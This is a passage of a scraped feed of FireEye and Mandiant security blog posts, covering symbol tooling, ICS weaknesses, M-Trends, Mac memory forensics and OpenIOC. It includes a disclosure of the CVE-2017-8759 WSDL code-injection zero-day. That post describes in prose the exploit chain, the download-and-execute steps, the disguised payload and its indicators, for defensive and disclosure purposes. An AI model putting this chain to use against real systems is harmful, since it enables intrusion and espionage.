href=\"https://www.fireeye.com/content/dam/legacy/ammo/PBX-screen-shot.jpg\"><img src=\"https://www.fireeye.com/content/dam/legacy/ammo/PBX-screen-shot-300x174.jpg\" title=\"PBX screen shot\" class=\"alignnone size-medium wp-image-2516\" width=\"300\" height=\"174\" /></a></p> \n <p>The library tab allows you to create and search a library of PDB type information. I have created a library for *most* of the operating systems we support for the following important system binaries: kernel (ntoskrnl.exe, ntkrpamp, ntkrnlpa, ntkrnlmp),ndis.sys, win32k.sys and hal (hal.dll, halaacpi.dll, halmacpi.dll). You might ask why other system DLLs were not included, such askernel32, user32, advapi32, etc.The answer to that being the corresponding PDBs for those binaries you get off the symbol server are stripped of type information. Why? Because Microsoft expects you to use their headers when you compile your application, and thus <u>your</u> program'sPDB will have the necessary type information.</p> \n <p>The library included with PdbXtract covers several of Microsoft's major operating system releases, but you can easily add more symbols. PdbXtract includes a utility, called PdbFetch, that simply runs Microsoft's symchk utility to grab the symbols for the file names you supply (usage: pdbfetch, where is a text file that contains a list of full paths to system binaries you want to retrieve symbols for). Pdbfetch creates a \"PDB set\" which consists ofthe directory structure with containing PDBs as created by symchkplus a manifest.xml file which summarizes the OSplatform information. To use a PDB set in PdbXtract, go to the library tab and click \"new\" if you want to create a new library from the PDB set or \"add\" if you want to add them to an existing library. Once you create/add a PDB set to a library you can delete them - the only thing that matters is the sqlite .pdbx database that's created.</p> \n <p>Perhaps someone out there will find this useful and maybe create a searchable web front end with the resulting SQLite database? The sky is the limit. Let me know if you do by commenting below.</p> \n <p>As a final note, you might wonder why you can't just download the entire symbol packages from Microsoft, which include every symbol file on the MS Symbol server, and create a ginormous library. Why is there a requirement to acquire the PDBs using pdbfetch? The answer is - you could do that - but it is data overload(several GB of PDBs) when you will not care about 99% of them. Plus it is easier to capture OS platform/build info at run time rather than guessing at it from the name of the symbol package installer (PDBs give no indication of what OS the corresponding binary originated from).</p> \n</div>","descriptionType":"html","publishedDate":"Tue, 24 Apr 2012 18:54:21 +0000","feedId":1226,"bgimg":"","linkMd5":"7d8c5ac470986f97effcf603ad197ee9","bgimgJsdelivr":"","metaImg":"","author":"Aaron LeMasters","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/PBX-screen-shot-300x174.jpg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn96@2020_1/2020/08/24/14-11-18-070_c3015cea42510610.webp"},"publishedOrCreatedDate":1598278264213},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"What About the Plant Floor? Six Subversive Concerns for ICS Environments","link":"http://www.fireeye.com/blog/threat-research/2017/04/six-subversive-concerns-for-ics-environments.html","description":"<p>Industrial enterprises such as electric utilities, petroleum companies, and manufacturing organizations invest heavily in <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">industrial control systems (ICS)</a> to efficiently, reliably, and safely operate industrial processes. Without this technology operating the plant floor, these businesses cannot exist.</p> \n<p>Board members, executives, and security officers are often unaware that the technology operating the economic engine of their enterprise invites undetected subversion. &nbsp;</p> \n<p>In this paper, FireEye iSIGHT Intelligence prepares risk executives and security practitioners to knowledgeably discuss six core weaknesses an adversary can use to undermine a plant's operation:</p> \n<ul> \n <li>Unauthenticated protocols</li> \n <li>Outdated hardware</li> \n <li>Weak user authentication</li> \n <li>Weak file integrity checks</li> \n <li>Vulnerable Windows operating systems</li> \n <li>Undocumented third-party relationships</li> \n</ul> \n<p>Download <a href=\"https://www2.fireeye.com/WEB-Subversive-Six_RPT.html?utm_source=FEcom&amp;utm_campaign=subversivesix&amp;utm_medium=blog\">the report</a> to learn more.&nbsp;To discuss these six subversive vulnerabilities threatening today’s industrial environments, <a href=\"https://engage.vevent.com/rt/fireeyeinc~subversivesix?utm_source=FEcom&amp;utm_campaign=subversivesix&amp;utm_medium=blog&amp;code=blog\">register for our live webinar</a> scheduled for Tuesday, April 25 at 11:00am ET/8:00am PT. Explore the implications and how to address them firsthand with our ICS intelligence experts.</p>","descriptionType":"html","publishedDate":"Wed, 12 Apr 2017 12:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"ac3b8160b942f9cd5e54f5b5bd829847","bgimgJsdelivr":"","metaImg":"","author":"Sean McBride","publishedOrCreatedDate":1598278264215},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"FireEye Uncovers CVE-2017-8759: Zero-Day Used in the Wild to Distribute\nFINSPY,FireEye Uncovers CVE-2017-8759: Zero-Day Used in the Wild to\nDistribute FINSPY","link":"http://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html","description":"<p>FireEye recently detected a malicious Microsoft Office RTF document that leveraged <a href=\"https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8759\">CVE-2017-8759</a>, a SOAP <a href=\"https://msdn.microsoft.com/en-us/library/ms996486.aspx\">WSDL</a> parser code injection vulnerability. This vulnerability allows a malicious actor to inject arbitrary code during the parsing of SOAP WSDL definition contents. <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services.html\" target=\"_self\">Mandiant</a> analyzed a Microsoft Word document where attackers used the arbitrary code injection to download and execute a Visual Basic script that contained PowerShell commands.</p> \n<p>FireEye shared the details of the vulnerability with Microsoft and has been coordinating public disclosure timed with the release of a patch to address the vulnerability and security guidance, which can be found <a href=\"https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8759\">here</a>.</p> \n<p>FireEye email, endpoint and network products detected the malicious documents.</p> \n<h4>Vulnerability Used to Target Russian Speakers</h4> \n<p>The malicious document, “Проект.doc” (MD5: fe5c4d6bb78e170abf5cf3741868ea4c), might have been used to target a Russian speaker. Upon successful exploitation of CVE-2017-8759, the document downloads multiple components (details follow), and eventually launches a FINSPY payload (MD5: a7b990d5f57b244dd17e9a937a41e7f5).</p> \n<p>FINSPY malware, also reported as FinFisher or <a href=\"http://download.microsoft.com/download/E/B/0/EB0F50CC-989C-4B66-B7F6-68CD3DC90DE3/Microsoft_Security_Intelligence_Report_Volume_21_English.pdf\">WingBird</a>, is available for purchase as part of a “lawful intercept” capability. Based on this and previous use of <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html\">FINSPY</a>, we assess with moderate confidence that this malicious document was used by a nation-state to target a Russian-speaking entity for cyber espionage purposes. Additional detections by FireEye’s Dynamic Threat Intelligence system indicates that related activity, though potentially for a different client, might have occurred as early as July 2017.</p> \n<h4>CVE-2017-8759 WSDL Parser Code Injection</h4> \n<p>A code injection vulnerability exists in the WSDL parser module within the PrintClientProxy method (<a href=\"http://referencesource.microsoft.com/#System.Runtime.Remoting/metadata/wsdlparser.cs,6111\">http://referencesource.microsoft.com/ - System.Runtime.Remoting/metadata/wsdlparser.cs,6111</a>). The IsValidUrl does not perform correct validation if provided data that contains a CRLF sequence. This allows an attacker to inject and execute arbitrary code. A portion of the vulnerable code is shown in Figure 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig1.png\" /> <br /> <span class=\"type-XS\">Figure 1: Vulnerable WSDL Parser</span></p> \n<p>When multiple <i>address</i> definitions are provided in a SOAP response, the code inserts the “//base.ConfigureProxy(this.GetType(),” string after the first address, commenting out the remaining addresses. However, if a CRLF sequence is in the additional addresses, the code following the CRLF will not be commented out. Figure 2 shows that due to lack validation of CRLF, a System.Diagnostics.Process.Start method call is injected. The generated code will be compiled by csc.exe of .NET framework, and loaded by the Office executables as a DLL.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig2.png\" /> <br /> <span class=\"type-XS\">Figure 2: SOAP definition VS Generated code</span></p> \n<h4>The In-the-Wild Attacks</h4> \n<p>The attacks that FireEye observed in the wild leveraged a Rich Text Format (RTF) document, similar to the <a href=\"https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html\">CVE-2017-0199</a> documents we previously reported on. The malicious sampled contained an embedded SOAP monikers to facilitate exploitation (Figure 3).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig3.png\" /> <br /> <span class=\"type-XS\">Figure 3: SOAP Moniker</span></p> \n<p>The payload retrieves the malicious SOAP WSDL definition from an attacker-controlled server. The WSDL parser, implemented in System.Runtime.Remoting.ni.dll of .NET framework, parses the content and generates a .cs source code at the working directory. The csc.exe of .NET framework then compiles the generated source code into a library, namely http[url path].dll. Microsoft Office then loads the library, completing the exploitation stage. &nbsp;Figure 4 shows an example library loaded as a result of exploitation.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig4.png\" /> <br /> <span class=\"type-XS\">Figure 4: DLL loaded</span></p> \n<p>Upon successful exploitation, the injected code creates a new process and leverages mshta.exe to retrieve a HTA script named “word.db” from the same server. The HTA script removes the source code, compiled DLL and the PDB files from disk and then downloads and executes the FINSPY malware named “left.jpg,” which in spite of the .jpg extension and “image/jpeg” content-type, is actually an executable. Figure 5 shows the details of the PCAP of this malware transfer.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig5.png\" /> <br /> <span class=\"type-XS\">Figure 5: Live requests</span></p> \n<p>The malware will be placed at %appdata%\\Microsoft\\Windows\\OfficeUpdte-KB[ 6 random numbers ].exe. Figure 6 shows the process create chain under Process Monitor.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig6.png\" /> <br /> <span class=\"type-XS\">Figure 6: Process Created Chain</span></p> \n<h4>The Malware</h4> \n<p>The “left.jpg” (md5: a7b990d5f57b244dd17e9a937a41e7f5) is a variant of FINSPY. It leverages heavily obfuscated code that employs a built-in virtual machine – among other anti-analysis techniques – to make reversing more difficult. As likely another unique anti-analysis technique, it parses its own full path and searches for the string representation of its own MD5 hash. Many resources, such as analysis tools and sandboxes, rename files/samples to their MD5 hash in order to ensure unique filenames. This variant runs with a mutex of \"WininetStartupMutex0\".</p> \n<h4>Conclusion</h4> \n<p>CVE-2017-8759 is the second zero-day vulnerability used to distribute FINSPY uncovered by FireEye in 2017. These exposures demonstrate the significant resources available to “lawful intercept” companies and their customers. Furthermore, FINSPY has been sold to multiple clients, suggesting the vulnerability was being used against other targets.</p> \n<p>It is possible that CVE-2017-8759 was being used by additional actors. While we have not found evidence of this, the zero day being used to distribute FINSPY in April 2017, CVE-2017-0199 was simultaneously being used by a financially motivated actor. If the actors behind FINSPY obtained this vulnerability from the same source used previously, it is possible that source sold it to additional actors.</p> \n<h4>Acknowledgement</h4> \n<p>Thank you to Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and <a href=\"https://www.fireeye.com/solutions/isight-cyber-threat-intelligence-subscriptions.html\">FireEye iSIGHT Intelligence</a> for their contributions to this blog. We also thank everyone from the Microsoft Security Response Center (MSRC) who worked with us on this issue.</p>","descriptionType":"html","publishedDate":"Tue, 12 Sep 2017 17:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig1.png","linkMd5":"2ad7a7fe51d8b60bdef399fb1684c386","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn51@2020_6/2020/08/24/14-11-05-025_d03a08fb89dc706e.webp","destWidth":1856,"destHeight":1002,"sourceBytes":107372,"destBytes":93956,"author":"Genwei Jiang","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig1.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn51@2020_6/2020/08/24/14-11-05-025_d03a08fb89dc706e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig2.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn62@2020_3/2020/08/24/14-11-13-903_7db8402f0518f846.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig3.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn50@2020_3/2020/08/24/14-11-16-434_91f9b81112f3fd50.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig4.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn96@2020_3/2020/08/24/14-11-16-290_e1548c0b35a6d475.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig5.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn78@2020_3/2020/08/24/14-11-16-894_cca740e9ae4ded1a.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/SOAP%200day/Fig6.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn33@2020_2/2020/08/24/14-11-17-388_8b134b9d5f541f73.webp"},"publishedOrCreatedDate":1598278264191},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"M-Trends #1: Malware Only Tells Half the Story","link":"http://www.fireeye.com/blog/threat-research/2012/05/mtrends-1-malware-tells-story.html","description":"<div class=\"c00 c00v1\"> \n <p>When I joined Mandiant earlier this year, I was given the opportunity to help write our annual <a href=\"https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html\">M-Trends report</a>. This is the third year Mandiant has published the report, which is a summary of the trends we've observed in our investigations over the last twelve months.</p> \n <p>I remember reading Mandiant's <a href=\"https://www2.fireeye.com/WEB-2010-MNDT-RPT-M-Trends-2010_LP.html\">first M-Trends report</a> when it came out in 2010 and recall being surprised that Mandiant didn't pull any punches. They talked about the advanced persistent threat or APT (they had been using that term for several years...long before it was considered a cool marketing, buzz word), and they were open about the origin of the attacks. The report summarized what I'd been seeing in industry, and offered useful insights for detection and response. Needless to say, I enjoyed the opportunity to work on the latest version.</p> \n <p>In this year's report it details six trends we identified in 2011. We developed the six trends for the report very organically. That is, I spent quite a few days and nights reading all of the reports from our outstanding incident response team and wrote about what we saw-we didn't start with trends and then look for evidence to support them.</p> \n <p>If you haven't picked up a copy of the report yet, you can do so <a href=\"https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html\">here</a>. I will be blogging on each of the six trends over the next two weeks; you can even view the videos we've developed for each trend as each blog post is published:</p> \n <p> <b>Malware Only Tells Half the Story</b>.</p> \n <p>Of the many systems compromised in each investigation, about half of them were never touched by attacker malware.</p> \n <p>In so many cases, the intruders logged into systems and took data from them (or used them as a staging point for exfiltration), but didn't install tools. It is ironic that the very systems that hold the data targeted by an attacker are probably the least likely to have malware installed on them. While finding the malware used in an intrusion is important, it is impossible to understand the full scope of an intrusion if this is the focal point of the investigation. We illustrate actual examples of this in the graphical spread on pages 6-7 of the report.</p> \n <p>What does this mean for victim organizations?</p> \n <p>You could start by looking for malware, but don't end there! A smart incident response process will seek to fully understand the scope of compromise and find all impacted systems in the environment. This could mean finding the registry entries that identify lateral movement, traces of deleted .rar files in unallocated space, or use of a known compromised account. It turns out that Mandiant has a <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">product </a>that does all of this, but the footnote on page 5 is the only mention you'll see in the entire report (and even that was an afterthought).</p> \n <p>Thoughts and questions about this trend or the<a href=\"https://www2.fireeye.com/WEB-2012-MNDT-RPT-M-Trends-2012_LP.html\"> M-Trends</a> report?</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 14 May 2012 20:45:15 +0000","feedId":1226,"bgimg":"","linkMd5":"a1e4123d38194a39770aeeac13fe1e06","bgimgJsdelivr":"","metaImg":"","author":"Grady Summers","publishedOrCreatedDate":1598278264213},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Unibody Memory Analysis -- Introducing Memoryze™ for the Mac 1.0","link":"http://www.fireeye.com/blog/threat-research/2012/06/unibody-memory-analysis-introducing-mac-memoryze.html","description":"<div class=\"c00 c00v1\"> \n <p>Today, Mandiant is introducing a new free tool, <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" title=\"Memoryze for the Mac 1.0\">Memoryze™ for the Mac 1.0</a>, which brings memory imaging and analysis to the Mac. It joins a growing list of <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/memoryze.html\" title=\"Freeware Tools\">freeware tools</a> Mandiant currently provides.</p> \n <p>Memoryze™ for the Mac 1.0 brings many of the features of <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html\">Memoryze</a>™<sup> </sup>to the Apple Macintosh platform. This new tool enables acquisition of memory images via the command-line or a simple GUI. In addition, Memoryze™ for the Mac 1.0 can perform offline analysis against memory images or <i>live </i>analysis on a running system.</p> \n <p>The tool supports the following features:</p> \n <ul> \n  <li>Imaging the full range of system memory</li> \n  <li>Acquiring individual processes memory regions</li> \n  <li>Enumerating all running processes\n   <ul> \n    <li>Including those hidden by rootkits</li> \n   </ul> </li> \n </ul> \n <p>For each process, Memoryze™ for the Mac 1.0 can:</p> \n <ul> \n  <li>Report all open file handles in a process (e.g. all files,sockets, pipes, etc.)</li> \n  <li>List the virtual address space of a process including loaded libraries and allocated portions of heap and execution stack</li> \n  <li>List network connections\n   <ul> \n    <li>Active and listening</li> \n   </ul> </li> \n  <li>Enumerate\n   <ul> \n    <li>All loaded kernel extensions including those hidden by rootkits</li> \n    <li>The System Call Table and Mach Trap Table</li> \n    <li>All running Mach Tasks</li> \n   </ul> </li> \n </ul> \n <p>Okay, enough of the marketing. Memoryze™ for the Mac 1.0 can be downloaded <a href=\"http://www.fireeye.com/content/fireeye-www/site-content/en_US/retired-pages-do-not-activate/memoryze-for-the-mac.html\" title=\"Mac Memoryze\">here</a>. To help get you started we'll present a few of the features in this blog post.</p> \n <p>For offline analysis your first step is going to be acquiring memory. The Mac Memory Dumper App makes this process as simple as pushing a button. To begin the acquisition, Memoryze™ for the Mac 1.0 will require you to authenticate so that the application can load a memory dumping driver. After selecting the location to store the image and authenticating, Memoryze™ for the Mac 1.0 will begin the acquisition process. The tool will provide you with a progress bar and an image size monitor for each of your acquisitions (fancy, huh?).</p> \n <p>Note that the final size of the dumped image may exceed the size of your physical RAM. If the system has 8GB of physical RAM installed the dump may be 10GB. You may ask yourself, \"Self, why is the dumped image bigger than my actual memory size?\" There are regions that are physically addressable but are not part of actual DRAM, pesky memory-mapped devices. These regions are written to the image file as 0x0-bytes to help preserve the correct offsets within the image.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/1.png\"><img width=\"300\" height=\"138\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/1-300x138.png\" title=\"1\" class=\"alignnone size-medium wp-image-2870\" /></a></p> \n <p>Once Memoryze™ for the Mac 1.0 finishes the acquisition; we can use it to perform memory analysis(note Memoryze™ for the Mac 1.0 can also perform analysis on images acquired by other tools). With our data ready, let's run through several of the process analysis features we mentioned above.</p> \n <p>We'll start by performing a basic process listing based on the memory image we just created. Execute the command below:</p> \n <p> <code>macmemoryze proclist -f ~/Documents/my.mem 2&gt;err.txt</code></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/21.png\"><img width=\"300\" height=\"93\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/21-300x93.png\" title=\"2\" class=\"alignnone size-medium wp-image-2881\" /></a></p> \n <p>Memoryze™ for the Mac 1.0 will open \"my.mem\" for analysis and detect two critical pieces of information about the image: the operating system version and whether the system is running 32 or 64-bit kernel. Armed with this information the proclist analysis module locates the operating system data structure that maintains the list of running processes.</p> \n <p>If you take a look at the output below, you can see that Memoryze™ for the Mac 1.0 extracts the PADDR, or physical address, of each process (this is also the offset of the process in the acquired memory image file). You can use the PADDR to quickly locate the process in question in an offline tool such as a hex editor. Memoryze™ for the Mac 1.0 also extracts other standard identifying information such as the process NAME, PID and parent PID (PPID). In addition, the tool provides the start time for each process in UTC. Finally, Memoryze™ for the Mac 1.0 extracts each process' associated USERNAME, effective userid (EUID), and real userid (RUID).</p> \n <p>Based on the process listing above, we may be interested in getting a more complete understanding of what a particular process may be doing. We can list file descriptors and memory sections for all of the processes in the listing, but this would get pretty lengthy and present too much information at once. Using filters we can limit display to a smaller subset or a single process. We can use the \"-n\" option to filter processes by NAME or the \"-p\" to filter processes by PID.Execute the following command:</p> \n <p> <code>macmemoryze proclist -w -p 14 ~/Documents/my.mem 2&gt;err.txt</code></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/3.png\"><img width=\"300\" height=\"125\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/3-300x125.png\" title=\"3\" class=\"alignnone size-medium wp-image-2872\" /></a></p> \n <p>In the image above, we show a snippet of a file descriptor listing for PID 14 using the command-line switch \"-p 14\". This shows us all open file descriptors for the given process. This includes files, UNIX domain sockets, networking sockets (such as TCP), and so on. For several of the types/subtypes, Memoryze™ for the Mac 1.0 will provide a value associated with the item type. The value for a descriptor of type FILE is the filename associated with the file descriptor while the value for a type SOCKET subtype TCP is the source IP address, destination IP address, and associated ports.</p> \n <p>Now that we've completed some filtering, let's dig a little deeper and perform detailed analysis of the \"notifyd\" process. The image below contains a snippet of its memory sections listing. Memoryze™ for the Mac 1.0 shows us the start and end virtual addresses and a human-readable size for each section. For some memory sections, Memoryze™ for the Mac 1.0 also provides a type, such as <code>MALLOC</code> or <code>IOKIT</code>. These types provide insight into the purpose of the memory section. For other memory sections, Memoryze™ for the Mac 1.0 displays the filename that is located at (or was used to initialize) that particular memory region. Please execute:</p> \n <p> <code>macmemoryze proclist -s -p 14 ~/Documents/my.mem 2&gt;err.txt</code></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/4.png\"><img width=\"300\" height=\"124\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/4-300x124.png\" title=\"4\" class=\"alignnone size-medium wp-image-2873\" /></a></p> \n <p>Neat, huh? So now we've analyzed the standard operating system (OS) process list structure. If it's good enough for the OS, it's good enough for us, right? Not really. It's fairly trivial for malware to unlink itself from the process list that the OS maintains. In light of this, Memoryze™ for the Mac 1.0 provides a process carving feature that allows it to enumerate and analyze processes based on their signature in memory. This means that Memoryze™ for the Mac 1.0 does not have to depend on the OS to provide a list of processes. This enables Memoryze™ for the Mac 1.0 to discover processes that have been hidden from standard OS listings. This same carving feature extends to the kextlist and syscalllist Memoryze™ for the Mac 1.0 features, allowing you to discover other hidden data within the OS.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Note.jpg\"><img width=\"494\" height=\"268\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Note.jpg\" title=\"NOTE\" class=\"size-full wp-image-2900 aligncenter\" /></a></p> \n <p>Now don't forget, Memoryze™ for the Mac 1.0 can be run offline using an acquired memory image, or <i>live</i>, analyzing the running system in real-time. Below we show a system call table listing using the <i>live</i> memory analysis feature of Memoryze™ for the Mac 1.0. Notice the missing \"-f\" option. We can use this listing to check for system call table hooking. System call table hooking allows attackers to surreptitiously monitor or filter user-level programs interactions with the OS kernel. This is commonly used to hide files and network connections from user-level programs. The syscalllist feature also supports discovery and listing of the Mach Trap table. Mach Trap, what? The mach trap table is analogous to the system call table in the BSD portion of OS X, but within the Mach portion of OS X. So we want to ensure we can check for possible hooking within that table also. To perform a live listing execute:</p> \n <p> <code>sudo macmemoryze syscalllist -s</code></p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/6.png\"><img width=\"300\" height=\"207\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/6-300x207.png\" title=\"6\" class=\"alignnone size-medium wp-image-2876\" /></a></p> \n <p>In order to hook the syscall table we would probably want to use a driver. Have no fear! Memoryze™ for the Mac 1.0 can carve loaded kexts from memory. A decent malware author would probably want to hide itself from the OS by unlinking from internal data structures. To combat this, Memoryze™ for the Mac 1.0 will parse live memory or a dead file to find loaded drivers, as shown in the screenshot below.</p> \n <p> <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/7.png\"><img width=\"300\" height=\"108\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/7-300x108.png\" title=\"7\" class=\"alignnone size-medium wp-image-2877\" /></a></p> \n <p>Memoryze™ for the Mac 1.0 supports an XML output option (\"-x\") that will create an XML file with an extended version of the console output, only in XML format. \"Extended version,\" you ask? There is only so much console real estate. We must make decision about what information to display. So therefore, stuff gets left out. For example, we parse the full file path of the executing process and the process arguments. These are not displayed in the console output, but are accessible if using the XML output option. These XML files can also be loaded into <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Mandiant Redline™</a> (currently windows only, boo!) for viewing in a GUI.</p> \n <p>There are other features of Memoryze™ for the Mac 1.0 that we have not detailed here, but we don't want to give you all the answers. What's the fun in that? We really want you to use the tool and provide us with some feedback on features, interface, usages, and so on.</p> \n <p>Memoryze™ for the Mac 1.0 currently supports:</p> \n <ul> \n  <li>Mac OS X Snow Leopard (10.6) 32/64-bit</li> \n  <li>Mac OS X Lion (10.7) 32/64-bit</li> \n </ul> \n <p>We hope to continue to improve the state of Mac memory analysis for incident responders and security professionals.</p> \n <p>\"Mac\" is a trademark of The Apple Corporation. Mandiant is not affiliated with or endorsed by The Apple Corporation.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 28 Jun 2012 20:02:47 +0000","feedId":1226,"bgimg":"","linkMd5":"16a19d4ec8922804719feaf1761ca63d","bgimgJsdelivr":"","metaImg":"","author":"Seth and Steve Davis","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/ammo/1-300x138.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn95@2020_3/2020/08/24/14-11-21-246_a6e3952bdcdd560d.webp","https://www.fireeye.com/content/dam/legacy/ammo/21-300x93.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn31@2020_5/2020/08/24/14-11-20-000_304a8abe334e5bda.webp","https://www.fireeye.com/content/dam/legacy/ammo/3-300x125.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn7@2020_3/2020/08/24/14-11-18-387_1fbbf52611c8334f.webp","https://www.fireeye.com/content/dam/legacy/ammo/4-300x124.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn38@2020_5/2020/08/24/14-11-17-401_9b34c6f9b00f349c.webp","https://www.fireeye.com/content/dam/legacy/ammo/Note.jpg":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn53@2020_6/2020/08/24/14-11-14-379_8b136befaaa6eebb.webp","https://www.fireeye.com/content/dam/legacy/ammo/6-300x207.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn99@2020_4/2020/08/24/14-11-11-698_cc9c503765a951e7.webp","https://www.fireeye.com/content/dam/legacy/ammo/7-300x108.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn93@2020_1/2020/08/24/14-11-18-906_ad48e1fdd2f16f74.webp"},"publishedOrCreatedDate":1598278264217},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The History of OpenIOC","link":"http://www.fireeye.com/blog/threat-research/2013/09/history-openioc.html","description":"<div class=\"c00 c00v1\"> \n <p>With the buzz in the security industry this year about sharing threat intelligence, it's easy to get caught up in the hype, and believe that proper, effective sharing of Indicators or Intelligence is something that can just be purchased along with goods or services from any security vendor.</p> \n <p>It's really a much more complex problem than most make it out to be, and one that we've been working on for a while. A large part of our solution for managing Threat Indicators is using the <a href=\"http://www.openioc.org/\" target=\"_blank\">OpenIOC</a> standard format.</p> \n <p>Since its founding, Mandiant sought to solve the problem of how to conduct leading-edge <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\" target=\"_blank\">Incident Response</a> (IR) - and how to scale that response to an entire enterprise. We created OpenIOC as an early step in tackling that problem. Mandiant released OpenIOC to the public as an Open Source project under the Apache 2 license in November of 2011, but OpenIOC had been used internally at Mandiant for several years prior.</p> \n <p>IR is a discipline that usually requires highly trained professionals doing very resource-intensive work. Traditionally, these professionals would engage in time-intensive investigations on only a few hosts on a compromised network. Practical limitations on staffing, resources, time, and money would prevent investigations from covering anything other than a very small percentage of most enterprises. Responders would only be able to examine what they had direct access to, with their corresponding conclusions constrained by time and budget.</p> \n <p>This level of investigation was almost never enough to give confidence on anything other than the hosts that had been examined - responders were unable to confirm whether other systems were still compromised, or whether the adversary still had footholds in other parts of the network.</p> \n <p>Creating a standard way of recording Threat Intelligence into an Indicator was part of what allowed Mandiant to bring a new approach to IR, including the use of an automated solution, such as <a href=\"https://www.mandiant.com/products/mandiant-platform/intelligent-response\" target=\"_blank\">Mandiant for Intelligent Response® (MIR®)</a>. Mandiant's new strategy for IR enabled investigators, who previously could only get to a few hosts in an engagement, to now query entire enterprises in only slightly more time. Using OpenIOC as a standardized format, the Indicators of Compromise (IOCs) were recorded once, and then used to help gather the same information and conduct the same testing on every host across the enterprise via the automated solution. Incident Responders could now spend only a little more time, but cover an exponentially larger number of hosts during the course of an investigation.</p> \n <p>Recording the IOCs in OpenIOC had other benefits as well. Indicators from one investigation could be shared with other investigations or organizations, and allow investigators to look for the exact same IOCs wherever they were, without having to worry about translation problems associated with ambiguous formats, such as lists or text documents. One investigator could create an IOC, and then share it with others, who could put that same IOC into their investigative system and look for the same evil as the first person, with little to no additional work.</p> \n <p>The format grew organically over time. We always intended that the format be expandable and improvable. Instead of trying to map out every possible use case, Mandiant has updated the format and expanded the dictionaries of IOC Terms as new needs have arisen over time. The version we released in 2011 as \"1.0\" had already been revised and improved upon internally several times before its Open Source debut. We continue to update the standard as needed, allowing for features and requests that we have received over time from other users or interested parties.</p> \n <p>Unlike traditional \"signatures,\" OpenIOC provides the ability to use logical 